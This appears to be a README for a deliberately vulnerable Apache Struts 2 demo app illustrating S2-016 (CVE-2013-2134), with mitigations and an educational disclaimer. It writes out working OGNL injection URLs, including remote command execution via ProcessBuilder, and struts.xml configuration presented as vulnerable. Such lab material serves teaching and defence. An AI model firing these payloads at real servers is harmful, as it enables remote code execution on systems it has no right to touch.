# S2-016 Vulnerability Demonstration

## Overview
This application demonstrates the Apache Struts 2 vulnerability identified as **CVE-2013-2134** (S2-016). The vulnerability arises due to improper sanitization of parameters prefixed with `action:`, `redirect:`, or `redirectAction:`. These prefixes are used by the Struts 2 DefaultActionMapper to attach navigational information to buttons within forms. However, the information following these prefixes is evaluated as OGNL expressions against the value stack, introducing the possibility of server-side code injection.

## How the Vulnerability is Exploited

### Simple Expression Evaluation
1. A request like the following can exploit the vulnerability by evaluating OGNL expressions:
   ```
   http://localhost:8080/example/X.action?action:%25{3*4}
   http://localhost:8080/example/X.action?redirect:%25{3*4}
   ```
   These URLs will evaluate the OGNL expression `%{3*4}` and return the result.

### Remote Command Execution
1. A request like the following can exploit the vulnerability to execute arbitrary commands on the server:
   ```
   http://localhost:8080/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'calc'})).start()}
   http://localhost:8080/example/X.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'calc'})).start()}
   http://localhost:8080/example/X.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'calc'})).start()}
   ```
   These URLs will execute the `calc` command on the server.

## Demonstration in This Application

1. **Vulnerable ActionMapper Configuration**:
   - The `struts.xml` file contains the following vulnerable configuration:
     ```xml
     <action name="*" class="com.demo.action.PageAction">
         <result>/example/{1}.jsp</result>
     </action>
     ```
   - This allows user input to dynamically determine the JSP file to load, enabling OGNL injection.

2. **Command Execution via Redirect**:
   - The `struts.xml` file contains the following vulnerable configuration:
     ```xml
     <action name="redirectExample" class="com.demo.action.RedirectExampleAction">
         <result name="success" type="redirect">/example/{1}.jsp</result>
     </action>

     <action name="commandExecution" class="com.demo.action.CommandExecutionAction">
         <result name="success" type="redirectAction">/example/{1}.jsp</result>
     </action>
     ```
   - These configurations allow OGNL expressions to be evaluated in the `redirect` and `redirectAction` parameters, enabling command execution.

## Mitigation
To secure the application:

1. **Disable Dynamic Method Invocation**:
   - Set `struts.enable.DynamicMethodInvocation` to `false` in `struts.xml`.

2. **Sanitize Input**:
   - Ensure that all user input is properly validated and sanitized to prevent OGNL injection.

3. **Upgrade Struts**:
   - Use a patched version of Apache Struts 2 where this vulnerability is fixed.

## Disclaimer
This application is for educational purposes only. Exploiting vulnerabilities without proper authorization is illegal and unethical.